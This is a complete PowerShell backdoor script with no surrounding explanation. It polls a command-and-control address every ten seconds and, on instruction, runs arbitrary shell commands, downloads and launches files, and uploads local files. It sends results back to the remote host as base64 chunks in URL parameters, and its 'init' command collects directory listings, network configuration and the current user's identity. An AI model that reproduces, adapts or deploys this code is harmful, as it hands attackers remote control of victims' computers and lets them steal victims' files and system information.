$cc_addr = "$ip/admin/"
$part_len = 100
$id = [Environment]::UserName
$md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
$utf8 = new-object -TypeName System.Text.UTF8Encoding
$hash = ([System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($id))) -replace '[-]','').substring(0,6)
Write-Host $hash.substring(0,6)
function send_reply ($cmd_id,$packet) 
{
$val=0
$last_part =0
$packet_id =1
while($val -le $packet.Length)
     {
	 	if($packet.Length - $val -le $part_len)
	   {
	   	Write-Host "last part"
		$last_part =1
	 }
       if (!$last_part)
       {
	   $part = $packet.substring($val,$part_len)
	   	Write-Host $part
		$wc = New-Object System.Net.WebClient
		$wc.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
        $result = $wc.DownloadString("http://"+$cc_addr+"/?i="+$hash+"&cid="+$cmd_id+"&p="+$packet_id+"&d="+$part+"")
	   }
	   else
	   {
	   	$part = $packet.substring($val)
	   	Write-Host $part

        $wc = New-Object System.Net.WebClient
		$wc.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
        $result = $wc.DownloadString("http://"+$cc_addr+"/?i="+$hash+"&cid="+$cmd_id+"&p="+$packet_id+"&d="+$part+"&fin=1")
	   }
		$val+=$part_len
    	$packet_id++
	}
}
function execute_cmd ($cmd)
{	
	$res =""
	$res = iex "cmd /c $cmd"
	$res = [Convert]::ToBase64String([Text.Encoding]::Default.GetBytes($res))
	return $res
}
function ask_cmd ($cmd)
{
    $wc = New-Object System.Net.WebClient
    $wc.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
	$result = $wc.DownloadString("http://"+$cc_addr+"/?i="+$hash+"&cid=woot&name=webinar")
		return $result
}
while( 1 )
{
$new_cmd = ask_cmd
$new_cmd = $new_cmd.Split(" ")
$cid= $new_cmd[0]
$op = $new_cmd[1]
$arg =  $new_cmd[2]
$arg =[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($arg))

switch ($op){
     idle
	 {
	 	break
	 }
	 shex
	 {
	 	$2send = execute_cmd $arg
	 	send_reply $cid $2send
	 	break
	 }
     dnld {
		(New-Object System.Net.WebClient).DownloadFile("http://"+$cc_addr+$arg, $env:temp+"\gotfile.dat")
	  	send_reply $cid "ZG5sb2FkIGRvbmU="
	 	break}
     upload 
	 {	
	 	$bytes = Get-Content $arg -encoding Byte
		$res = [Convert]::ToBase64String($bytes)
		send_reply $cid $res
	 	break
	 }
    exec
	{
		Start-Process $arg
		break
    }
	init
	{
		$2send = execute_cmd "dir %homepath%\documents;ipconfig;whoami"
	 	send_reply $cid $2send
		break
    }
     default {"Something else happened"; break}
     }
sleep 10
}